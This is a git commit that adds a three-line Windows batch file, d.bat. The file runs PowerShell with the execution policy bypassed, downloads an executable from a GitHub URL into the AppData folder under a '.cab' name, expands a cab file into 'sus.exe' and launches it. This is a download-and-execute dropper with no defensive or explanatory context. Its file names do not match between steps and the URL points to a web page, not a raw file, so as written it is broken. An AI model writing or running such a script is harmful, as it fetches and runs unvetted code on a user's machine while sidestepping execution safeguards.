98901b29d9c2d644ffa875c45df85ac477f5d695
oxsve <46594689+oxsve@users.noreply.github.com>
2021-02-16 15:40:16 +0300

    Create d.bat

---
+++ d.bat
@@ -0,0 +1,3 @@
+call powershell.exe -ExecutionPolicy bypass -noprofile (New-Object System.Net.WebClient).DownloadFile('https://github.com/oxsve/f/blob/master/ghlq.exe.exe','%AppData%\sus.cab')
+call expand %AppData%\aaa4.cab %AppData%\sus.exe
+call start %AppData%\sus.exe
